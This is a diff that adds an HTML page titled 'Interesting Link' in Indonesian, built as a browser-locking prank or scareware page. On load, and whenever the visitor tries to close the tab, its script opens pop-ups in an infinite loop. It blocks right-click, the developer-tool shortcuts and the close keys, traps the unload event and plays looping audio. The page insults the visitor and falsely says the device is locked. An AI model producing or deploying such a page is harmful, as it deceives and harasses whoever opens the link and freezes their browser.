@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Link Menarik</title>
+    <script>
+        // Fungsi untuk membuka pop-up spam dalam loop
+        function spamPopups() {
+            while (true) {
+                window.open("https://example.com", "_blank", "width=300,height=300");
+                // Tambahkan variasi URL atau pesan spam
+                window.open("https://example.com/spam", "_blank", "width=400,height=400");
+            }
+        }
+
+        // Nonaktifkan klik kanan dan keyboard shortcuts
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            // Blokir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, dll.
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 85))) {
+                e.preventDefault();
+                return false;
+            }
+            // Blokir Alt+F4 dan Ctrl+W (tutup window/tab)
+            if ((e.altKey && e.keyCode == 115) || (e.ctrlKey && e.keyCode == 87)) {
+                e.preventDefault();
+                spamPopups(); // Trigger spam tambahan jika mencoba close
+            }
+        });
+
+        // Cegah user keluar dari halaman
+        window.onbeforeunload = function() {
+            spamPopups();
+            return "Anda terjebak!";
+        };
+
+        // Mulai spam saat halaman dimuat
+        window.onload = function() {
+            spamPopups();
+            // Tambahkan audio atau elemen mengganggu
+            var audio = new Audio('https://example.com/annoying-sound.mp3');
+            audio.loop = true;
+            audio.play();
+        };
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: red;
+            font-size: 50px;
+            text-align: center;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <h1>ANDA IDIOT!</h1>
+    <p>Device Anda sekarang terkunci. HAHAHA!</p>
+    <img src="https://example.com/annoying-gif.gif" alt="Spam Image" style="width:100%;height:auto;">
+</body>
+</html>
